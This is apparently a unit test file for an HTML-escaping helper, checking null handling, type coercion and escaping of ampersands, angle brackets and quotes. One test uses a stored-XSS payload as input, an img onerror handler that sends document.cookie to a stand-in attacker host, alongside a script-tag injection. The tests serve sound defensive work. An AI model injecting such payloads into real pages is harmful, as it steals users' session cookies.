import { escapeHtml } from './htmlEscape';

describe('escapeHtml', () => {
  it('returns plain strings unchanged when no HTML special chars are present', () => {
    expect(escapeHtml('hello')).toBe('hello');
    expect(escapeHtml('Rintaro Okabe')).toBe('Rintaro Okabe');
    expect(escapeHtml('Phone Microwave (rev 2)')).toBe('Phone Microwave (rev 2)');
  });

  it('returns an empty string for null or undefined', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('treats the empty string as empty (not as "the literal text undefined")', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('coerces non-string scalars to their string form', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(0)).toBe('0');
    expect(escapeHtml(false)).toBe('false');
    expect(escapeHtml(true)).toBe('true');
  });

  it('escapes ampersands first so other replacements do not double-encode', () => {
    // If & were not replaced before < / > / " / ', this would become
    // &amp;amp;lt; instead of &amp;lt;.
    expect(escapeHtml('&lt;')).toBe('&amp;lt;');
    expect(escapeHtml('&amp;')).toBe('&amp;amp;');
  });

  it('escapes < and > so an injected tag becomes text content', () => {
    expect(escapeHtml('<script>alert(1)</script>')).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;'
    );
  });

  it('escapes < and > inside attribute-like payloads (the stored-XSS exploit shape)', () => {
    const payload = "<img src=x onerror=fetch('https://attacker/?c='+document.cookie)>";
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<img');
    expect(escaped).not.toContain('>');
    expect(escaped).toContain('&lt;img src=x onerror=fetch(&#39;https://attacker/?c=&#39;+document.cookie)&gt;');
  });

  it('escapes double and single quotes', () => {
    expect(escapeHtml('"quoted"')).toBe('&quot;quoted&quot;');
    expect(escapeHtml("it's")).toBe('it&#39;s');
  });

  it('escapes every special character in a mixed payload', () => {
    expect(escapeHtml('a&b<c>d"e\'f')).toBe('a&amp;b&lt;c&gt;d&quot;e&#39;f');
  });

  it('leaves characters that are not HTML-special untouched', () => {
    // Punctuation, spaces, digits, non-ASCII letters, and emoji must
    // round-trip exactly so legitimate experiment data still renders.
    const input = '実験-01 — done! 🚀 100%';
    expect(escapeHtml(input)).toBe(input);
  });
});
